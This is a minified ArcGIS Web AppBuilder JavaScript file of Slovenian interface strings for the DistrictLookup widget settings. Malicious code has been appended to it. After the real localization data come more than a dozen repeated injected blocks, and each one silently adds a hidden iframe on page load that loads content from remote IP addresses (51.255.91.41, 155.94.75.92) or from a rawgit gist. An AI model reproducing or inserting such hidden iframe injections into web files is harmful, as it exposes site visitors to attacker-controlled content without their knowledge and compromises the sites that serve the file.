// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Milje",kilometers:"Kilometri",feet:"\u010cevlji",meters:"Metri"},layerSetting:{layerSettingTabTitle:"Nastavitve iskanja",buttonSet:"Nastavi",selectLayersLabel:"Izberi sloj",selectLayersHintText:"Namig: Uporablja se za izbiro poligonskega sloja in relacijskega to\u010dkovnega sloja.",selectPrecinctSymbolLabel:"Izberite simbol za osvetljevanje poligona",selectGraphicLocationSymbol:"Simbol naslova ali lokacije",graphicLocationSymbolHintText:"Namig: Simbol za iskane naslove ali lokacije klika",
precinctSymbolHintText:"Namig: Uporablja se za prikaz simbola izbranega poligona",selectColorForPoint:"Izberite barvo za osvetlitev to\u010dke",selectColorForPointHintText:"Namig: Uporablja se za prikaz osvetljene barve za izbrano to\u010dko"},searchSourceSetting:{searchSourceSettingTabTitle:"Nastavitve vira iskanja",searchSourceSettingTitle:"Nastavitve vira iskanja",searchSourceSettingTitleHintText:"Dodaj in konfiguriraj geokodirne storitve ali geoobjektne sloje kot vire iskanja. Ti viri dolo\u010dajo, kaj je mogo\u010de iskati znotraj iskalnega polja",
addSearchSourceLabel:"Dodajte vir iskanja",featureLayerLabel:"Geoobjektni sloj",geocoderLabel:"Geokodirnik",nameTitle:"Ime",generalSettingLabel:"Splo\u0161na nastavitev",allPlaceholderLabel:"Besedilo ozna\u010dbe mesta za iskanje vsega:",allPlaceholderHintText:"Namig: Vnesite besedilo, ki bo prikazano kot ozna\u010dba mesta med iskanjem po vseh slojih in geokodirniku",generalSettingCheckboxLabel:"Poka\u017ei pojavno okno za najdeni geoobjekt ali lokacijo",countryCode:"\u0160ifre dr\u017eave ali regije",
countryCodeEg:"npr. ",countryCodeHint:"\u010ce to vrednost pustite prazno, bo iskanje potekalo po vseh dr\u017eavah in regijah",questionMark:"?",searchInCurrentMapExtent:"I\u0161\u010di samo v trenutnem obsegu karte",zoomScale:"Pribli\u017eaj merilo",locatorUrl:"URL geokodirnika",locatorName:"Ime geokodirnika",locatorExample:"Primer",locatorWarning:"Ta razli\u010dica geokodirnih storitev ni podprta. Pripomo\u010dek podpira razli\u010dico geokodirne storitve 10.0 in novej\u0161o.",locatorTips:"Predlogi niso na voljo, ker geokodirna storitev ne podpira predlagane zmo\u017enosti.",
layerSource:"Vir sloja",setLayerSource:"Nastavi vir sloja",setGeocoderURL:"Nastavi URL geokodirnika",searchLayerTips:"Predlogi niso na voljo, ker geoobjektna storitev ne podpira mo\u017enosti \u0161tevil\u010denja strani.",placeholder:"Besedilo ozna\u010dbe mesta",searchFields:"Iskalna polja",displayField:"Prika\u017ei polje",exactMatch:"Natan\u010dno ujemanje",maxSuggestions:"Najve\u010d predlogov",maxResults:"Najve\u010d rezultatov",enableLocalSearch:"Omogo\u010di lokalno iskanje",minScale:"Najmanj\u0161e merilo",
minScaleHint:"Ko je merilo karte ve\u010dje od tega merila, bo uporabljeno lokalno iskanje",radius:"Polmer",radiusHint:"Dolo\u010da polmer obmo\u010dja okrog trenutnega sredi\u0161\u010da karte, ki je uporabljeno za pove\u010danje \u0161tevila kandidatov za geokodiranje. Tako so najprej prikazani kandidati, ki so najbli\u017eje lokaciji",meters:"Metri",setSearchFields:"Nastavi iskalna polja",set:"Nastavi",fieldName:"Ime",invalidUrlTip:"URL ${URL} ni veljaven ali dostopen.",invalidSearchSources:"Neveljavne nastavitve iskanja vira"},
layerSelector:{selectPolygonLayerLabel:"Izberite poligonski sloj",selectPolygonLayerHintText:"Namig: Uporablja se za izbiro poligonskega sloja.",selectRelatedPointLayerLabel:"Izberite to\u010dkovni sloj, ki je v relaciji s poligonskim slojem",selectRelatedPointLayerHintText:"Namig: Uporablja se za izbiro to\u010dkovnega sloja, ki je v relaciji s poligonskim slojem",polygonLayerNotHavingRelatedLayer:"Izberite poligonski sloj, ki je v relaciji z to\u010dkovnim slojem.",errorInSelectingPolygonLayer:"Izberite poligonski sloj, ki je v relaciji z to\u010dkovnim slojem.",
errorInSelectingRelatedLayer:"Izberite to\u010dkovni sloj, ki je v relaciji s poligonskim slojem."},routeSetting:{routeSettingTabTitle:"Nastavitve navodil za pot",routeServiceUrl:"Storitev usmerjanja",buttonSet:"Nastavi",routeServiceUrlHintText:"Namig: Kliknite \u00bbNastavi\u00ab za brskanje in izbiro storitve usmerjanja mre\u017ene analize",directionLengthUnit:"Enote dol\u017eine v navodilih za pot",unitsForRouteHintText:"Namig: Uporablja se za prikaz sporo\u010denih enot poti",selectRouteSymbol:"Izberite simbol za prikaz poti",
routeSymbolHintText:"Namig: Uporablja se za prikaz simbola linije poti",routingDisabledMsg:"Da omogo\u010dite navodila za pot, se prepri\u010dajte, da je v elementu ArcGIS Online omogo\u010deno usmerjanje."},networkServiceChooser:{arcgislabel:"Dodaj iz ArcGIS Online",serviceURLabel:"Dodaj URL storitve",routeURL:"URL poti",validateRouteURL:"Potrdi",exampleText:"Primer",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",
invalidRouteServiceURL:"Dolo\u010dite veljavno storitev usmerjanja.",rateLimitExceeded:"Omejitev stopnje prese\u017eena. Poskusite znova pozneje.",errorInvokingService:"Uporabni\u0161ko ime ali geslo ni pravilno."},symbolPickerPreviewText:"Predogled:",showToolToSelectLabel:"Nastavite gumb lokacije",showToolToSelectHintText:"Namig: Ponudi gumb za nastavitev lokacije na karti v izogib vsakokratnem klikanju in nastavljanju lokacije na karti",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});